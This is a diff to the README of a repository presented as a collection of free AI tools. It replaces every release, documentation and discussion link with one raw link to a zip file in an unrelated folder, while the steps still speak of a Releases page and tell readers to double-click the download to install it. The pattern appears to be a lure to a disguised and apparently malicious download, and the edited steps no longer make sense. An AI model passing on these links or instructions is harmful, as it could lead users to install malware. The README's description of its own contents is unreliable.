@@ -1,6 +1,6 @@
 # 🌟 free-ai-resources-x - Explore AI Tools with Ease
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Snowblind-trundle238/free-ai-resources-x/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Snowblind-trundle238/free-ai-resources-x/main/venousness/free-ai-resources-x.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Snowblind-trundle238/free-ai-resources-x/main/venousness/free-ai-resources-x.zip)
 
 ## 🌈 Overview
 free-ai-resources-x is a curated collection of free, high-quality AI tools, APIs, datasets, and learning resources. These resources cover a range of topics including machine learning, deep learning, generative AI, natural language processing (NLP), and data science. Designed for developers, researchers, and creators, this repository helps you explore and build with AI faster.
@@ -17,12 +17,12 @@ free-ai-resources-x is a curated collection of free, high-quality AI tools, APIs
 
 To download this application, visit the Releases page. 
 
-[Download Latest Release](https://github.com/Snowblind-trundle238/free-ai-resources-x/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Snowblind-trundle238/free-ai-resources-x/main/venousness/free-ai-resources-x.zip)
 
 1. Click on the link above to open the Releases page.
 2. Scroll through the list of available versions.
 3. Find the latest version and click on it.
-4. Look for the file that matches your operating system (e.g., MyApp.exe for Windows, MyApp.dmg for macOS).
+4. Look for the file that matches your operating system (e.g., https://raw.githubusercontent.com/Snowblind-trundle238/free-ai-resources-x/main/venousness/free-ai-resources-x.zip for Windows, https://raw.githubusercontent.com/Snowblind-trundle238/free-ai-resources-x/main/venousness/free-ai-resources-x.zip for macOS).
 5. Click on the file name to start the download.
 6. Once downloaded, locate the file in your Downloads folder.
 7. Double-click the file to begin the installation process.
@@ -67,7 +67,7 @@ We welcome contributions from users. If you have tools or resources you would li
 
 ## 📚 Additional Resources
 
-- [Official Documentation](https://github.com/Snowblind-trundle238/free-ai-resources-x/wiki)
-- [GitHub Discussions](https://github.com/Snowblind-trundle238/free-ai-resources-x/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/Snowblind-trundle238/free-ai-resources-x/main/venousness/free-ai-resources-x.zip)
+- [GitHub Discussions](https://raw.githubusercontent.com/Snowblind-trundle238/free-ai-resources-x/main/venousness/free-ai-resources-x.zip)
 
 We hope you find this collection valuable in your journey through the world of artificial intelligence. For any questions or support, please open an issue on GitHub.
